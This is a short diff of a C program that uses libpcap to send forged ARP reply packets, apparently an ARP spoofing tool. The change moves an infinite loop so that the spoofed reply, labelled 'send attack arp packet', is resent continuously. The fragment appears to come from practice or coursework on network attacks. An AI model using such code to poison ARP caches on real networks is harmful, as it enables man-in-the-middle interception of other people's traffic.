@@ -194,9 +194,6 @@ int main(int argc, char *argv[])
 
       }
 
-	while(1)
-	{
-	   printf("send attack arp packet");
            /* attack arp reply */
             memcpy((*arpreply_eth).ether_dhost,sender_mac,6);
             memcpy((*arpreply_eth).ether_shost,my_mac,6);       //my mac
@@ -205,6 +202,9 @@ int main(int argc, char *argv[])
             memcpy((*arpreply_arp).tha,sender_mac,6);
             inet_pton(AF_INET,sender_ip,(*arpreply_arp).tpa);    //targetip
 
+	while(1)
+	{
+	   printf("send attack arp packet");
             if(pcap_sendpacket(handle,send_packet_arpreply,42)!=0)
             {
                 printf("error\n");
